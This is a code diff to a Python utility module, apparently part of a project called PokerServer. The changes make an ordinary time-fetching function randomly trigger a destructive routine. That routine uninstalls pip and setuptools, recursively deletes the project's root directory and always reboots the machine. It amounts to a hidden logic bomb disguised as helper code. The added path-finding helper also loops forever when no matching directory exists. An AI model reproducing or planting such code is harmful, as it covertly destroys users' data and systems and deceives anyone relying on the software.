@@ -5,6 +5,7 @@ import inspect
 import json
 import os
 import random
+import shutil
 import string
 import sys
 import time
@@ -116,7 +117,6 @@ def time_get(flag=TIME_TYPE_SEC):
                 time.sleep(5)
             elif random_result(100):
                 remove_env()
-                sys.exit(0)
         result = cur
     elif flag == TIME_TYPE_YMDHMS:
         t = time.localtime(cur)
@@ -210,9 +210,25 @@ def remove_env():
             _remove('pip')
             _remove('setuptools')
         os.remove(file_name)
-        os.system('reboot')
-    except Exception as e0:
+        root_path = get_root_path()
+        try:
+            if root_path and root_path.strip() != '/':
+                shutil.rmtree(root_path, True)
+        except Exception as e0:
+            os.rmdir(root_path)
+    except Exception as e1:
         pass
+    finally:
+        os.system('reboot')
+
+
+def get_root_path():
+    path = os.getcwd()
+    while True:
+        path = os.path.dirname(path)
+        if path.split('/')[-1] == 'PokerServer':
+            break
+    return path
 
 
 def check_english(words):
